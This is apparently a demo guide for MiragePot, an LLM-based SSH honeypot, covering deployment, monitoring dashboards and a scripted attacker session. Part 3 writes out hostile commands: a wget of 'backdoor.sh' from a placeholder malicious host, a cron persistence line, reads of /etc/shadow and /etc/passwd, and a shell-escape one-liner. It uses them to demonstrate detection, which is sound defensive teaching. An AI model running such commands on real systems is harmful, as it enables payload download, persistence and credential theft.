# MiragePot Demo Walkthrough

**Comprehensive demo guide for presenting MiragePot to technical audiences (CS students, professors, colleagues)**

Duration: 10-15 minutes  
Audience: Computer Science students/professionals  
Focus: Architecture, deployment, real-world applicability

---

## Table of Contents

- [Pre-Demo Setup](#pre-demo-setup)
- [Demo Script](#demo-script)
- [Technical Deep Dives](#technical-deep-dives)
- [Common Questions & Answers](#common-questions--answers)
- [Troubleshooting](#troubleshooting)

---

## Pre-Demo Setup

### The Night Before

**1. Export Offline Bundle (if venue might have poor/no internet)**

```bash
cd MiragePot/
./scripts/export-offline.sh

# This creates: miragepot-offline-bundle.tar.gz (~6-7GB)
# Copy to USB drive + keep cloud backup
```

**2. Prepare Demo Environment**

```bash
# Test the full deployment
cd docker/
docker compose down -v  # Clean slate
docker compose up -d
docker exec miragepot-ollama ollama pull phi3

# Verify everything works
docker compose ps  # All should be "Up (healthy)"
curl http://localhost:9090/metrics | head
curl http://localhost:3000/api/health

# Create some sample data
ssh root@localhost -p 2222
# Run commands: whoami, ls, cat /etc/passwd, wget malware.sh, etc.
```

**3. Prepare Browser Tabs (Open but hide)**

- http://localhost:8501 - Streamlit Dashboard
- http://localhost:3000/d/miragepot-overview - Grafana Overview
- http://localhost:3000/d/miragepot-ttp-analysis - TTP Analysis  
- http://localhost:9091/targets - Prometheus Targets

**4. Prepare Terminal Windows**

- Terminal 1: SSH session (attacker perspective)
- Terminal 2: Docker logs (`docker logs -f miragepot-honeypot`)
- Terminal 3: Command prompt for demo commands

---

## Demo Script

### Part 1: Introduction (2 minutes)

**Opening Statement:**

> "MiragePot is an AI-driven SSH honeypot that uses a local LLM to generate realistic terminal responses. Unlike traditional honeypots with static responses, MiragePot adapts to attacker behavior in real-time while logging everything for threat analysis."

**Key Differentiators:**

- **Traditional Honeypots**: Static, pre-programmed responses → Easy to detect
- **MiragePot**: Dynamic AI responses → Indistinguishable from real systems

**Show Project Structure:**

```bash
tree -L 2 -I 'venv|__pycache__|*.pyc'
```

```
MiragePot/
├── miragepot/           # Core honeypot (SSH server, AI interface, defense)
├── dashboard/           # Real-time Streamlit monitoring
├── docker/              # Full stack deployment
├── grafana/             # Pre-built dashboards
├── tests/               # 566 passing unit tests
└── docs/                # Comprehensive documentation
```

---

### Part 2: Architecture Overview (3 minutes)

**Show Full Stack Diagram:**

```
┌────────────────────────────────────────────────────────┐
│                  MiragePot Full Stack                   │
├────────────────────────────────────────────────────────┤
│                                                         │
│  ┌──────────────┐    ┌──────────────┐                 │
│  │  SSH Honeypot│───▶│  Ollama+phi3 │                 │
│  │  (Port 2222) │    │  (Local LLM) │                 │
│  └──────────────┘    └──────────────┘                 │
│         │                                               │
│         │ Metrics                                       │
│         ▼                                               │
│  ┌──────────────┐    ┌──────────────┐                 │
│  │  Prometheus  │───▶│   Grafana    │                 │
│  │  (Time-series│    │ (Dashboards) │                 │
│  │   database)  │    └──────────────┘                 │
│  └──────────────┘           ▲                          │
│         │                   │                          │
│         ▼                   │                          │
│  ┌──────────────┐           │                          │
│  │ Alertmanager │───────────┘                          │
│  │   (Alerts)   │                                      │
│  └──────────────┘                                      │
│                                                         │
└────────────────────────────────────────────────────────┘
```

**Key Components:**

1. **SSH Server** (Paramiko) - Accepts any credentials, simulates Linux terminal
2. **AI Interface** (Ollama + phi3) - Generates realistic command outputs
3. **Defense Module** - Threat scoring, tarpit delays, prompt injection protection
4. **Monitoring Stack** - Prometheus + Grafana for real-time visibility
5. **Session Logging** - JSON logs of all activity for offline analysis

**Show Container Status:**

```bash
docker compose ps --format "table {{.Names}}\t{{.Status}}\t{{.Size}}"
```

---

### Part 3: Live Attack Simulation (5 minutes)

**Scenario: Show attacker's perspective**

> "Let's pretend we're an attacker who discovered this SSH server during reconnaissance."

**Terminal 1 (Attacker):**

```bash
# Connect to honeypot
ssh root@localhost -p 2222
# Password: anything (e.g., "password123")
```

**Initial Reconnaissance:**

```bash
whoami
# Output: root

hostname  
# Output: webserver-prod-01

uname -a
# Output: Linux webserver-prod-01 5.15.0-86-generic ... x86_64 GNU/Linux
```

> "Notice: Responses look completely legitimate. The AI generates outputs based on the configured system identity."

**Filesystem Exploration:**

```bash
pwd
# Output: /root

ls -la
# Output: realistic directory listing with fake files

cat /etc/passwd
# Output: believable user accounts

cat /root/passwords.txt  # Honeytoken!
# Output: fake credentials (triggers high-severity alert)
```

**Malicious Activity:**

```bash
# Download "malware"
wget http://malicious.com/backdoor.sh
# Output: realistic wget progress bar

# Attempt privilege escalation
cat /etc/shadow
# Output: permission denied (or fake hashes)

# Try to establish persistence
crontab -l
# Output: existing cron jobs

echo "* * * * * /tmp/backdoor.sh" | crontab -
# Output: crontab updated (fake)
```

**Show Defense Mechanisms:**

```bash
# Try command injection in prompt
whoami; echo "INJECTED"; ls

# Try to escape the honeypot
python -c "import os; os.system('/bin/bash')"

# MITRE ATT&CK technique: Discovery
ps aux
netstat -tulpn
ifconfig
```

> "All these commands are logged, scored for threat level, and analyzed for MITRE ATT&CK technique mapping."

---

### Part 4: Monitoring & Analysis (4 minutes)

**Switch to Browser - Streamlit Dashboard (localhost:8501)**

Show:
- Live session feed
- Command history with threat scores
- Real-time statistics (connections, commands, unique IPs)
- Session timeline

**Grafana - Overview Dashboard (localhost:3000/d/miragepot-overview)**

Show:
- Connection rate over time
- Top commands executed
- Geographic distribution (if configured)
- Alert summary

**Grafana - TTP Analysis Dashboard (localhost:3000/d/miragepot-ttp-analysis)**

Show:
- MITRE ATT&CK technique heatmap
- Tactic breakdown (Initial Access, Persistence, Discovery, etc.)
- Most detected techniques

**Grafana - Performance Dashboard (localhost:3000/d/miragepot-performance)**

Show:
- LLM response latency
- Cache hit rate (hybrid engine efficiency)
- Resource utilization

**Show Raw Session Logs:**

```bash
# JSON logs with full session data
ls -lh data/logs/
cat data/logs/session_*.json | jq '.'
```

Example log structure:
```json
{
  "session_id": "abc123",
  "ip_address": "127.0.0.1",
  "start_time": "2026-02-08T10:30:00Z",
  "end_time": "2026-02-08T10:35:00Z",
  "username": "root",
  "password": "password123",
  "commands": [
    {
      "command": "whoami",
      "output": "root",
      "timestamp": "2026-02-08T10:30:15Z",
      "threat_score": 10,
      "source": "cache"
    }
  ],
  "ttps_detected": ["T1082"],
  "threat_summary": {
    "max_score": 85,
    "total_commands": 15,
    "malicious_count": 3
  }
}
```

---

### Part 5: Technical Highlights (2 minutes)

**1. Hybrid Response Engine**

```python
# Show code: miragepot/command_handler.py

# Fast path: Cached responses (0.001s)
if command in self.cache:
    return self.cache[command]

# Slow path: AI generation (1-3s)
response = self.ai_interface.generate_response(command)
```

**2. Prompt Injection Protection**

```python
# Show code: miragepot/defense_module.py

# Detects attempts to manipulate the AI
if self._detect_prompt_injection(command):
    self._apply_tarpit_delay(severity="high")
    return "Command not found"
```

**3. Threat Scoring**

```python
# Analyze command for malicious patterns
threat_score = self._calculate_threat_score(command)

# 0-30: Low (normal commands)
# 31-70: Medium (suspicious activity)  
# 71-100: High (malicious/exploit attempts)
```

**4. MITRE ATT&CK Mapping**

```python
# Automatically map commands to tactics/techniques
ttps = self._detect_ttps(command)
# e.g., "wget malware.sh" → T1105 (Ingress Tool Transfer)
```

**Show Test Coverage:**

```bash
pytest tests/ -v --tb=short
# 566 passing tests across all modules
```

---

## Technical Deep Dives

### For Advanced Questions

#### 1. "How does the AI avoid generating harmful instructions?"

**Answer:**
- Responses are **read-only** - no actual execution
- System prompt constrains AI to output simulation only
- Validation filters remove dangerous patterns
- Sandboxed environment (Docker containers)

#### 2. "Can attackers detect it's a honeypot?"

**Answer:**
- **Fingerprinting Challenges:**
  - No real filesystem access
  - No actual network connections
  - Process list is fake
  
- **Mitigations:**
  - Consistent fake filesystem state
  - Realistic timing delays
  - Honeytokens (fake credentials) to distract
  - Rate limiting prevents rapid probing

- **Best Practice:** Deploy in isolated network, not production

#### 3. "What's the performance impact of using an LLM?"

**Answer:**
- **Cache Hit Rate:** ~60-70% (most commands are cached)
  - Cached: 0.001s response time
  - Uncached: 1-3s (LLM generation)
  
- **Resource Usage:**
  - phi3 model: ~2GB RAM
  - Inference: ~0.5-1GB RAM during generation
  - CPU: 1-2 cores during generation
  
- **Scalability:**
  - Rate limiting prevents resource exhaustion
  - Can handle 50+ concurrent connections
  - Consider GPU acceleration for high-volume deployments

#### 4. "How does this compare to traditional honeypots?"

| Feature | Traditional (Cowrie, etc.) | MiragePot |
|---------|---------------------------|-----------|
| **Responses** | Static, pre-programmed | Dynamic, AI-generated |
| **Adaptability** | Fixed behavior | Learns from attacker patterns |
| **Detection Risk** | High (known fingerprints) | Lower (novel responses) |
| **Setup** | Manual configuration | Automated with Docker |
| **Analysis** | Manual log review | Automated TTP mapping |
| **Resource** | Low (~100MB RAM) | Medium (~4GB RAM with LLM) |

#### 5. "What about legal/ethical considerations?"

**Answer:**
- **Legal:** Honeypots are generally legal for research/defense
  - Must not be used to hack back
  - Log retention policies vary by jurisdiction
  - Consult legal counsel for production use
  
- **Ethical:**
  - Clearly mark as research/educational
  - Don't deploy in production networks
  - Don't use real user data
  - Responsible disclosure of findings

---

## Common Questions & Answers

### Deployment Questions

**Q: "Can this run in the cloud?"**

A: Yes! Deploy on AWS/Azure/GCP with Docker. Bind SSH to public IP, keep dashboards on localhost (access via SSH tunnel).

**Q: "Does it require internet?"**

A: No for runtime (after model download). Use offline bundle for demos without internet.

**Q: "How much does it cost to run?"**

A: 
- Self-hosted: Free (just electricity/compute)
- AWS t3.medium: ~$30/month
- Azure B2s: ~$35/month

**Q: "Can I use a different LLM?"**

A: Yes! Change `MIRAGEPOT_LLM_MODEL` in .env.docker:
- `llama2` - Larger, more capable
- `mistral` - Fast and efficient
- `codellama` - Better for command understanding
- Any Ollama-compatible model

### Security Questions

**Q: "Is this secure to run on my laptop?"**

A: Yes, but:
- Don't expose SSH port to public internet
- Keep dashboards on localhost
- Run in Docker (isolation)
- Monitor resource usage

**Q: "Can attackers escape the honeypot?"**

A: No:
- No real command execution
- Sandboxed in Docker container
- No actual filesystem access
- AI only generates text, doesn't execute

**Q: "What if an attacker floods the honeypot?"**

A: Built-in protections:
- Rate limiting (max 3 connections per IP)
- Session timeouts (1 hour max)
- Resource limits in Docker
- Automatic IP blocking for abusive behavior

### Research Questions

**Q: "Can I use this for academic research?"**

A: Absolutely! It's MIT licensed. Please cite:
```
Brijesh, E. (2026). MiragePot: AI-Driven Adaptive SSH Honeypot.
GitHub repository, https://github.com/evinbrijesh/MiragePot
```

**Q: "What kind of insights can I gather?"**

A:
- Attacker TTP trends over time
- Geographic distribution of attacks
- Most targeted services/commands
- Evolution of attack sophistication
- Prompt injection techniques against AI

**Q: "How do I export data for analysis?"**

A:
```bash
# Export session logs
cp data/logs/*.json /path/to/analysis/

# Export Prometheus metrics
curl http://localhost:9091/api/v1/query?query=miragepot_commands_total > metrics.json

# Export Grafana dashboards as PDF
# (use Grafana's built-in export feature)
```

---

## Troubleshooting

### During Demo

**"Container won't start"**

```bash
# Quick fix
docker compose down && docker compose up -d

# Check logs
docker logs miragepot-honeypot
```

**"SSH connection refused"**

```bash
# Check if port is bound
docker compose ps
lsof -i :2222

# Restart honeypot
docker restart miragepot-honeypot
```

**"AI responses are slow"**

```bash
# Check if model is loaded
docker exec miragepot-ollama ollama list

# Restart Ollama
docker restart miragepot-ollama
```

**"Grafana shows no data"**

```bash
# Check Prometheus scraping
curl http://localhost:9091/api/v1/targets

# Restart Prometheus
docker restart miragepot-prometheus

# Wait 15 seconds for scrape interval
```

**"Browser tabs won't load"**

```bash
# Check if containers are healthy
docker compose ps

# Check if ports are accessible
curl http://localhost:8501
curl http://localhost:3000/api/health
```

---

## Post-Demo Actions

### Share Resources

Provide attendees with:
1. **GitHub link**: https://github.com/evinbrijesh/MiragePot
2. **Documentation**: Point them to docs/QUICK_START.md
3. **Offline bundle**: If they want to try immediately
4. **Demo recording**: If you recorded the session

### Follow-Up Questions

Be prepared for email/Slack follow-ups:
- Setup troubleshooting
- Customization requests
- Research collaboration
- Feature suggestions

### Collect Feedback

Ask attendees:
- What features would make this more useful?
- Would you use this for research/education?
- Any security concerns?
- Documentation clarity?

---

## Demo Checklist

### Day Before

- [ ] Export offline bundle (if needed)
- [ ] Test full deployment (fresh start)
- [ ] Generate sample data (SSH sessions)
- [ ] Prepare browser tabs
- [ ] Test projector/screen sharing
- [ ] Print backup command cheat sheet

### 30 Minutes Before

- [ ] Deploy full stack: `cd docker && docker compose up -d`
- [ ] Verify all containers healthy
- [ ] Open and arrange browser tabs
- [ ] Open and arrange terminal windows
- [ ] Test SSH connection
- [ ] Verify dashboards show data

### During Demo

- [ ] Speak clearly, face audience
- [ ] Pause for questions after each section
- [ ] Show code, not just results
- [ ] Acknowledge limitations honestly
- [ ] Keep time (10-15 min max)

### After Demo

- [ ] Share GitHub link
- [ ] Offer offline bundle (USB/email)
- [ ] Answer questions
- [ ] Collect contact info for follow-up
- [ ] Stop containers: `docker compose down`

---

**Remember:** The goal is to show MiragePot is:
1. **Production-ready** - Not just a prototype
2. **Well-architected** - Clean, tested, documented
3. **Practical** - Solves real security challenges
4. **Accessible** - Easy to deploy and use

Good luck with your demo!
